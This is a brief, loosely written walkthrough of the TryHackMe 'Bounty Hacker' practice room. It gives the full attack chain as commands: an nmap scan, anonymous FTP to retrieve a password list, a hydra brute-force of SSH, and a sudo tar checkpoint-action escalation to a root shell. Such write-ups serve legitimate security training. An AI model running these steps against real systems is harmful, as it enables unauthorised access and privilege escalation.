# TryHackMe Bounty Hacker 

## Room Info
- Difficulty: Easy
- Category: Bug Bounty
- Link: https://tryhackme.com/room/bountyhacker

nmap -sC -sV target_ip
Ports found are 22,21,80


Use ftp<TARGET_IP> to login anonymously and download the tar file as there is no Password to login and after ls for files and using the GET command donload the locks.txt and task.txt files.


WHile using ftp it also reviles the username as lin
use hydra -l lin -P locks.txt ssh [IP_ADDRESS] to get the password for lin user.


# use ssh lin@[IP_ADDRESS] to login to the machine.


# sudo-l to know about the privileges.


cat user.txt to get the first flag.

# To do the privilage escalation

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

cd ../../../

cat root.txt to get the second flag.